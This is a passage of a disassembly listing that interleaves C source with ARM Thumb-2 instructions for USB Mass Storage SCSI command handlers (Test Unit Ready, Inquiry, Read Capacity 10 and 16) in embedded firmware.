 8009b3e:	e01e      	b.n	8009b7e <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009b40:	68fb      	ldr	r3, [r7, #12]
 8009b42:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009b46:	68fa      	ldr	r2, [r7, #12]
 8009b48:	33b0      	adds	r3, #176	; 0xb0
 8009b4a:	009b      	lsls	r3, r3, #2
 8009b4c:	4413      	add	r3, r2
 8009b4e:	685b      	ldr	r3, [r3, #4]
 8009b50:	689b      	ldr	r3, [r3, #8]
 8009b52:	7afa      	ldrb	r2, [r7, #11]
 8009b54:	4610      	mov	r0, r2
 8009b56:	4798      	blx	r3
 8009b58:	4603      	mov	r3, r0
 8009b5a:	2b00      	cmp	r3, #0
 8009b5c:	d00b      	beq.n	8009b76 <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b5e:	7af9      	ldrb	r1, [r7, #11]
 8009b60:	233a      	movs	r3, #58	; 0x3a
 8009b62:	2202      	movs	r2, #2
 8009b64:	68f8      	ldr	r0, [r7, #12]
 8009b66:	f000 fb5b 	bl	800a220 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b6a:	697b      	ldr	r3, [r7, #20]
 8009b6c:	2205      	movs	r2, #5
 8009b6e:	721a      	strb	r2, [r3, #8]

    return -1;
 8009b70:	f04f 33ff 	mov.w	r3, #4294967295
 8009b74:	e003      	b.n	8009b7e <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009b76:	697b      	ldr	r3, [r7, #20]
 8009b78:	2200      	movs	r2, #0
 8009b7a:	60da      	str	r2, [r3, #12]

  return 0;
 8009b7c:	2300      	movs	r3, #0
}
 8009b7e:	4618      	mov	r0, r3
 8009b80:	3718      	adds	r7, #24
 8009b82:	46bd      	mov	sp, r7
 8009b84:	bd80      	pop	{r7, pc}
	...

08009b88 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b88:	b580      	push	{r7, lr}
 8009b8a:	b088      	sub	sp, #32
 8009b8c:	af00      	add	r7, sp, #0
 8009b8e:	60f8      	str	r0, [r7, #12]
 8009b90:	460b      	mov	r3, r1
 8009b92:	607a      	str	r2, [r7, #4]
 8009b94:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b96:	68fb      	ldr	r3, [r7, #12]
 8009b98:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009b9c:	68fb      	ldr	r3, [r7, #12]
 8009b9e:	32b0      	adds	r2, #176	; 0xb0
 8009ba0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ba4:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009ba6:	69bb      	ldr	r3, [r7, #24]
 8009ba8:	2b00      	cmp	r3, #0
 8009baa:	d102      	bne.n	8009bb2 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009bac:	f04f 33ff 	mov.w	r3, #4294967295
 8009bb0:	e062      	b.n	8009c78 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009bb2:	69bb      	ldr	r3, [r7, #24]
 8009bb4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bb8:	699b      	ldr	r3, [r3, #24]
 8009bba:	2b00      	cmp	r3, #0
 8009bbc:	d10b      	bne.n	8009bd6 <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009bbe:	69bb      	ldr	r3, [r7, #24]
 8009bc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bc4:	7f59      	ldrb	r1, [r3, #29]
 8009bc6:	2320      	movs	r3, #32
 8009bc8:	2205      	movs	r2, #5
 8009bca:	68f8      	ldr	r0, [r7, #12]
 8009bcc:	f000 fb28 	bl	800a220 <SCSI_SenseCode>
    return -1;
 8009bd0:	f04f 33ff 	mov.w	r3, #4294967295
 8009bd4:	e050      	b.n	8009c78 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009bd6:	687b      	ldr	r3, [r7, #4]
 8009bd8:	3301      	adds	r3, #1
 8009bda:	781b      	ldrb	r3, [r3, #0]
 8009bdc:	f003 0301 	and.w	r3, r3, #1
 8009be0:	2b00      	cmp	r3, #0
 8009be2:	d021      	beq.n	8009c28 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009be4:	687b      	ldr	r3, [r7, #4]
 8009be6:	3302      	adds	r3, #2
 8009be8:	781b      	ldrb	r3, [r3, #0]
 8009bea:	2b00      	cmp	r3, #0
 8009bec:	d105      	bne.n	8009bfa <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009bee:	2206      	movs	r2, #6
 8009bf0:	4923      	ldr	r1, [pc, #140]	; (8009c80 <SCSI_Inquiry+0xf8>)
 8009bf2:	69b8      	ldr	r0, [r7, #24]
 8009bf4:	f001 f8fa 	bl	800adec <SCSI_UpdateBotData>
 8009bf8:	e03d      	b.n	8009c76 <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009bfa:	687b      	ldr	r3, [r7, #4]
 8009bfc:	3302      	adds	r3, #2
 8009bfe:	781b      	ldrb	r3, [r3, #0]
 8009c00:	2b80      	cmp	r3, #128	; 0x80
 8009c02:	d105      	bne.n	8009c10 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009c04:	2208      	movs	r2, #8
 8009c06:	491f      	ldr	r1, [pc, #124]	; (8009c84 <SCSI_Inquiry+0xfc>)
 8009c08:	69b8      	ldr	r0, [r7, #24]
 8009c0a:	f001 f8ef 	bl	800adec <SCSI_UpdateBotData>
 8009c0e:	e032      	b.n	8009c76 <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009c10:	69bb      	ldr	r3, [r7, #24]
 8009c12:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c16:	7f59      	ldrb	r1, [r3, #29]
 8009c18:	2324      	movs	r3, #36	; 0x24
 8009c1a:	2205      	movs	r2, #5
 8009c1c:	68f8      	ldr	r0, [r7, #12]
 8009c1e:	f000 faff 	bl	800a220 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009c22:	f04f 33ff 	mov.w	r3, #4294967295
 8009c26:	e027      	b.n	8009c78 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c28:	68fb      	ldr	r3, [r7, #12]
 8009c2a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c2e:	68fa      	ldr	r2, [r7, #12]
 8009c30:	33b0      	adds	r3, #176	; 0xb0
 8009c32:	009b      	lsls	r3, r3, #2
 8009c34:	4413      	add	r3, r2
 8009c36:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c38:	69d9      	ldr	r1, [r3, #28]
 8009c3a:	7afa      	ldrb	r2, [r7, #11]
 8009c3c:	4613      	mov	r3, r2
 8009c3e:	00db      	lsls	r3, r3, #3
 8009c40:	4413      	add	r3, r2
 8009c42:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c44:	440b      	add	r3, r1
 8009c46:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009c48:	697b      	ldr	r3, [r7, #20]
 8009c4a:	3304      	adds	r3, #4
 8009c4c:	781b      	ldrb	r3, [r3, #0]
 8009c4e:	b29b      	uxth	r3, r3
 8009c50:	3305      	adds	r3, #5
 8009c52:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009c54:	687b      	ldr	r3, [r7, #4]
 8009c56:	3304      	adds	r3, #4
 8009c58:	781b      	ldrb	r3, [r3, #0]
 8009c5a:	b29b      	uxth	r3, r3
 8009c5c:	8bfa      	ldrh	r2, [r7, #30]
 8009c5e:	429a      	cmp	r2, r3
 8009c60:	d303      	bcc.n	8009c6a <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009c62:	687b      	ldr	r3, [r7, #4]
 8009c64:	3304      	adds	r3, #4
 8009c66:	781b      	ldrb	r3, [r3, #0]
 8009c68:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009c6a:	8bfb      	ldrh	r3, [r7, #30]
 8009c6c:	461a      	mov	r2, r3
 8009c6e:	6979      	ldr	r1, [r7, #20]
 8009c70:	69b8      	ldr	r0, [r7, #24]
 8009c72:	f001 f8bb 	bl	800adec <SCSI_UpdateBotData>
  }

  return 0;
 8009c76:	2300      	movs	r3, #0
}
 8009c78:	4618      	mov	r0, r3
 8009c7a:	3720      	adds	r7, #32
 8009c7c:	46bd      	mov	sp, r7
 8009c7e:	bd80      	pop	{r7, pc}
 8009c80:	2000010c 	.word	0x2000010c
 8009c84:	20000114 	.word	0x20000114

08009c88 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009c88:	b590      	push	{r4, r7, lr}
 8009c8a:	b087      	sub	sp, #28
 8009c8c:	af00      	add	r7, sp, #0
 8009c8e:	60f8      	str	r0, [r7, #12]
 8009c90:	460b      	mov	r3, r1
 8009c92:	607a      	str	r2, [r7, #4]
 8009c94:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009c96:	68fb      	ldr	r3, [r7, #12]
 8009c98:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009c9c:	68fb      	ldr	r3, [r7, #12]
 8009c9e:	32b0      	adds	r2, #176	; 0xb0
 8009ca0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ca4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009ca6:	697b      	ldr	r3, [r7, #20]
 8009ca8:	2b00      	cmp	r3, #0
 8009caa:	d102      	bne.n	8009cb2 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009cac:	f04f 33ff 	mov.w	r3, #4294967295
 8009cb0:	e075      	b.n	8009d9e <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009cb2:	68fb      	ldr	r3, [r7, #12]
 8009cb4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009cb8:	68fa      	ldr	r2, [r7, #12]
 8009cba:	33b0      	adds	r3, #176	; 0xb0
 8009cbc:	009b      	lsls	r3, r3, #2
 8009cbe:	4413      	add	r3, r2
 8009cc0:	685b      	ldr	r3, [r3, #4]
 8009cc2:	685c      	ldr	r4, [r3, #4]
 8009cc4:	697b      	ldr	r3, [r7, #20]
 8009cc6:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009cca:	3308      	adds	r3, #8
 8009ccc:	697a      	ldr	r2, [r7, #20]
 8009cce:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009cd2:	3204      	adds	r2, #4
 8009cd4:	7af8      	ldrb	r0, [r7, #11]
 8009cd6:	4619      	mov	r1, r3
 8009cd8:	47a0      	blx	r4
 8009cda:	4603      	mov	r3, r0
 8009cdc:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009cde:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009ce2:	2b00      	cmp	r3, #0
 8009ce4:	d106      	bne.n	8009cf4 <SCSI_ReadCapacity10+0x6c>
 8009ce6:	697b      	ldr	r3, [r7, #20]
 8009ce8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cec:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009cf0:	2b02      	cmp	r3, #2
 8009cf2:	d108      	bne.n	8009d06 <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009cf4:	7af9      	ldrb	r1, [r7, #11]
 8009cf6:	233a      	movs	r3, #58	; 0x3a
 8009cf8:	2202      	movs	r2, #2
 8009cfa:	68f8      	ldr	r0, [r7, #12]
 8009cfc:	f000 fa90 	bl	800a220 <SCSI_SenseCode>
    return -1;
 8009d00:	f04f 33ff 	mov.w	r3, #4294967295
 8009d04:	e04b      	b.n	8009d9e <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009d06:	697b      	ldr	r3, [r7, #20]
 8009d08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d0c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d0e:	3b01      	subs	r3, #1
 8009d10:	0e1b      	lsrs	r3, r3, #24
 8009d12:	b2da      	uxtb	r2, r3
 8009d14:	697b      	ldr	r3, [r7, #20]
 8009d16:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009d18:	697b      	ldr	r3, [r7, #20]
 8009d1a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d1e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d20:	3b01      	subs	r3, #1
 8009d22:	0c1b      	lsrs	r3, r3, #16
 8009d24:	b2da      	uxtb	r2, r3
 8009d26:	697b      	ldr	r3, [r7, #20]
 8009d28:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d2a:	697b      	ldr	r3, [r7, #20]
 8009d2c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d30:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d32:	3b01      	subs	r3, #1
 8009d34:	0a1b      	lsrs	r3, r3, #8
 8009d36:	b2da      	uxtb	r2, r3
 8009d38:	697b      	ldr	r3, [r7, #20]
 8009d3a:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009d3c:	697b      	ldr	r3, [r7, #20]
 8009d3e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d42:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d44:	b2db      	uxtb	r3, r3
 8009d46:	3b01      	subs	r3, #1
 8009d48:	b2da      	uxtb	r2, r3
 8009d4a:	697b      	ldr	r3, [r7, #20]
 8009d4c:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009d4e:	697b      	ldr	r3, [r7, #20]
 8009d50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d54:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d58:	161b      	asrs	r3, r3, #24
 8009d5a:	b2da      	uxtb	r2, r3
 8009d5c:	697b      	ldr	r3, [r7, #20]
 8009d5e:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009d60:	697b      	ldr	r3, [r7, #20]
 8009d62:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d66:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d6a:	141b      	asrs	r3, r3, #16
 8009d6c:	b2da      	uxtb	r2, r3
 8009d6e:	697b      	ldr	r3, [r7, #20]
 8009d70:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009d72:	697b      	ldr	r3, [r7, #20]
 8009d74:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d78:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d7c:	0a1b      	lsrs	r3, r3, #8
 8009d7e:	b29b      	uxth	r3, r3
 8009d80:	b2da      	uxtb	r2, r3
 8009d82:	697b      	ldr	r3, [r7, #20]
 8009d84:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009d86:	697b      	ldr	r3, [r7, #20]
 8009d88:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d8c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d90:	b2da      	uxtb	r2, r3
 8009d92:	697b      	ldr	r3, [r7, #20]
 8009d94:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009d96:	697b      	ldr	r3, [r7, #20]
 8009d98:	2208      	movs	r2, #8
 8009d9a:	60da      	str	r2, [r3, #12]

  return 0;
 8009d9c:	2300      	movs	r3, #0

}
 8009d9e:	4618      	mov	r0, r3
 8009da0:	371c      	adds	r7, #28
 8009da2:	46bd      	mov	sp, r7
 8009da4:	bd90      	pop	{r4, r7, pc}

08009da6 <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009da6:	b590      	push	{r4, r7, lr}
 8009da8:	b089      	sub	sp, #36	; 0x24
 8009daa:	af00      	add	r7, sp, #0
 8009dac:	60f8      	str	r0, [r7, #12]
 8009dae:	460b      	mov	r3, r1
 8009db0:	607a      	str	r2, [r7, #4]
 8009db2:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009db4:	68fb      	ldr	r3, [r7, #12]
 8009db6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009dba:	68fb      	ldr	r3, [r7, #12]
 8009dbc:	32b0      	adds	r2, #176	; 0xb0
 8009dbe:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009dc2:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009dc4:	69bb      	ldr	r3, [r7, #24]
 8009dc6:	2b00      	cmp	r3, #0
 8009dc8:	d102      	bne.n	8009dd0 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009dca:	f04f 33ff 	mov.w	r3, #4294967295
 8009dce:	e0ab      	b.n	8009f28 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009dd0:	68fb      	ldr	r3, [r7, #12]
 8009dd2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009dd6:	68fa      	ldr	r2, [r7, #12]
 8009dd8:	33b0      	adds	r3, #176	; 0xb0
 8009dda:	009b      	lsls	r3, r3, #2
 8009ddc:	4413      	add	r3, r2
 8009dde:	685b      	ldr	r3, [r3, #4]
 8009de0:	685c      	ldr	r4, [r3, #4]
 8009de2:	69bb      	ldr	r3, [r7, #24]
 8009de4:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009de8:	3308      	adds	r3, #8
 8009dea:	69ba      	ldr	r2, [r7, #24]
 8009dec:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009df0:	3204      	adds	r2, #4
 8009df2:	7af8      	ldrb	r0, [r7, #11]
 8009df4:	4619      	mov	r1, r3
 8009df6:	47a0      	blx	r4
 8009df8:	4603      	mov	r3, r0
 8009dfa:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009dfc:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009e00:	2b00      	cmp	r3, #0
 8009e02:	d106      	bne.n	8009e12 <SCSI_ReadCapacity16+0x6c>
 8009e04:	69bb      	ldr	r3, [r7, #24]
 8009e06:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e0a:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009e0e:	2b02      	cmp	r3, #2
 8009e10:	d108      	bne.n	8009e24 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009e12:	7af9      	ldrb	r1, [r7, #11]
 8009e14:	233a      	movs	r3, #58	; 0x3a
 8009e16:	2202      	movs	r2, #2
 8009e18:	68f8      	ldr	r0, [r7, #12]
 8009e1a:	f000 fa01 	bl	800a220 <SCSI_SenseCode>
    return -1;
 8009e1e:	f04f 33ff 	mov.w	r3, #4294967295
 8009e22:	e081      	b.n	8009f28 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e24:	687b      	ldr	r3, [r7, #4]
 8009e26:	330a      	adds	r3, #10
 8009e28:	781b      	ldrb	r3, [r3, #0]
 8009e2a:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e2c:	687b      	ldr	r3, [r7, #4]
 8009e2e:	330b      	adds	r3, #11
 8009e30:	781b      	ldrb	r3, [r3, #0]
 8009e32:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e34:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e36:	687b      	ldr	r3, [r7, #4]
 8009e38:	330c      	adds	r3, #12
 8009e3a:	781b      	ldrb	r3, [r3, #0]
 8009e3c:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e3e:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009e40:	687a      	ldr	r2, [r7, #4]
 8009e42:	320d      	adds	r2, #13
 8009e44:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009e46:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e48:	69bb      	ldr	r3, [r7, #24]
 8009e4a:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e4c:	2300      	movs	r3, #0
 8009e4e:	61fb      	str	r3, [r7, #28]
 8009e50:	e008      	b.n	8009e64 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009e52:	69ba      	ldr	r2, [r7, #24]
 8009e54:	69fb      	ldr	r3, [r7, #28]
 8009e56:	4413      	add	r3, r2
 8009e58:	3310      	adds	r3, #16
 8009e5a:	2200      	movs	r2, #0
 8009e5c:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e5e:	69fb      	ldr	r3, [r7, #28]
 8009e60:	3301      	adds	r3, #1
 8009e62:	61fb      	str	r3, [r7, #28]
 8009e64:	69bb      	ldr	r3, [r7, #24]
 8009e66:	68db      	ldr	r3, [r3, #12]
 8009e68:	69fa      	ldr	r2, [r7, #28]
 8009e6a:	429a      	cmp	r2, r3
 8009e6c:	d3f1      	bcc.n	8009e52 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009e6e:	69bb      	ldr	r3, [r7, #24]
 8009e70:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e74:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e76:	3b01      	subs	r3, #1
 8009e78:	0e1b      	lsrs	r3, r3, #24
 8009e7a:	b2da      	uxtb	r2, r3
 8009e7c:	69bb      	ldr	r3, [r7, #24]
 8009e7e:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009e80:	69bb      	ldr	r3, [r7, #24]
 8009e82:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e86:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e88:	3b01      	subs	r3, #1
 8009e8a:	0c1b      	lsrs	r3, r3, #16
 8009e8c:	b2da      	uxtb	r2, r3
 8009e8e:	69bb      	ldr	r3, [r7, #24]
 8009e90:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009e92:	69bb      	ldr	r3, [r7, #24]
 8009e94:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e98:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e9a:	3b01      	subs	r3, #1
 8009e9c:	0a1b      	lsrs	r3, r3, #8
 8009e9e:	b2da      	uxtb	r2, r3
 8009ea0:	69bb      	ldr	r3, [r7, #24]
 8009ea2:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009ea4:	69bb      	ldr	r3, [r7, #24]
 8009ea6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eaa:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009eac:	b2db      	uxtb	r3, r3
 8009eae:	3b01      	subs	r3, #1
 8009eb0:	b2da      	uxtb	r2, r3
 8009eb2:	69bb      	ldr	r3, [r7, #24]
 8009eb4:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009eb6:	69bb      	ldr	r3, [r7, #24]
 8009eb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ebc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ec0:	161b      	asrs	r3, r3, #24
 8009ec2:	b2da      	uxtb	r2, r3
 8009ec4:	69bb      	ldr	r3, [r7, #24]
 8009ec6:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009ec8:	69bb      	ldr	r3, [r7, #24]
 8009eca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ece:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ed2:	141b      	asrs	r3, r3, #16
 8009ed4:	b2da      	uxtb	r2, r3
 8009ed6:	69bb      	ldr	r3, [r7, #24]
 8009ed8:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009eda:	69bb      	ldr	r3, [r7, #24]
 8009edc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ee0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ee4:	0a1b      	lsrs	r3, r3, #8
 8009ee6:	b29b      	uxth	r3, r3
 8009ee8:	b2da      	uxtb	r2, r3
 8009eea:	69bb      	ldr	r3, [r7, #24]
 8009eec:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009eee:	69bb      	ldr	r3, [r7, #24]
 8009ef0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ef4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ef8:	b2da      	uxtb	r2, r3
 8009efa:	69bb      	ldr	r3, [r7, #24]
 8009efc:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009efe:	687b      	ldr	r3, [r7, #4]
 8009f00:	330a      	adds	r3, #10
 8009f02:	781b      	ldrb	r3, [r3, #0]
 8009f04:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009f06:	687b      	ldr	r3, [r7, #4]
 8009f08:	330b      	adds	r3, #11
 8009f0a:	781b      	ldrb	r3, [r3, #0]
 8009f0c:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f0e:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009f10:	687b      	ldr	r3, [r7, #4]
 8009f12:	330c      	adds	r3, #12
 8009f14:	781b      	ldrb	r3, [r3, #0]
 8009f16:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009f18:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009f1a:	687a      	ldr	r2, [r7, #4]
 8009f1c:	320d      	adds	r2, #13
 8009f1e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009f20:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
